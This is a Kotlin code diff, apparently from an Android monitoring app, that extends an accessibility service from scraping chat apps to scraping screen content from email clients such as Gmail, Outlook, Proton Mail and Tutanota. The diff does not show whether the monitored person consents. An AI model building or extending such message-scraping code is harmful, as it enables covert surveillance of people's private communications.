@@ -58,6 +58,19 @@ class AccessibilityMonitorService : AccessibilityService() {
         "com.google.android.apps.messaging",
     )
 
+    private val emailApps = setOf(
+        "com.google.android.gm",
+        "com.google.android.gm.lite",
+        "com.microsoft.office.outlook",
+        "com.yahoo.mobile.client.android.mail",
+        "ch.protonmail.android",
+        "me.proton.android.mail",
+        "com.tutanota",
+        "com.fastmail.app",
+        "com.samsung.android.email.provider",
+        "com.htc.sense.mail",
+    )
+
     override fun onServiceConnected() {
         serviceInfo = AccessibilityServiceInfo().apply {
             eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
@@ -83,8 +96,13 @@ class AccessibilityMonitorService : AccessibilityService() {
             return
         }
 
-        if (!repository.isMetricEnabled("chat_scraping")) return
-        if (packageName !in chatApps) return
+        val isChatApp = packageName in chatApps
+        val isEmailApp = packageName in emailApps
+
+        if (!isChatApp && !isEmailApp) return
+
+        if (isChatApp && !repository.isMetricEnabled("chat_scraping")) return
+        if (isEmailApp && !repository.isMetricEnabled("email_monitoring")) return
 
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
             event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
@@ -113,9 +131,11 @@ class AccessibilityMonitorService : AccessibilityService() {
                             timestampMs = System.currentTimeMillis(),
                         )
                     )
-                    repository.recordEvent(MonitoringEventKind.DEVICE_STATE, payload)
+                    val kind = if (isEmailApp) MonitoringEventKind.EMAIL_MONITORING
+                               else MonitoringEventKind.DEVICE_STATE
+                    repository.recordEvent(kind, payload)
                 }.onFailure { e ->
-                    AppLogger.log(this@AccessibilityMonitorService, "[agent]", "Chat scrape error: ${e.message}")
+                    AppLogger.log(this@AccessibilityMonitorService, "[agent]", "Scrape error ($packageName): ${e.message}")
                 }
             }
         }
